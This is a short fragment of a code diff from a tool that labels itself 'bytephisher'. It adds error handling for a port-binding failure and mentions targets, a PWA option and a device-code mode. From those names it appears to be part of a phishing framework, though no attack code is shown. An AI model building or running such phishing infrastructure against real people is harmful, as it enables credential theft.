+                targets=targets_store,
+                pwa=(_pwa_config(args) if args.pwa else None),
+                symbols=symbols_mod.Symbols.from_mode(args.symbols))
+        except OSError as e:
+            print(f"[bytephisher] cannot bind port {port}: "
+                  f"{type(e).__name__}: {e}")
+            db.close()
+            return 2
     # serve_forever() must run in its own thread, otherwise the socket is bound
     # but never accepts connections while the CLI sits in the live-dashboard loop.
     # (device-code mode already started its own thread inside core.devicecode.serve)
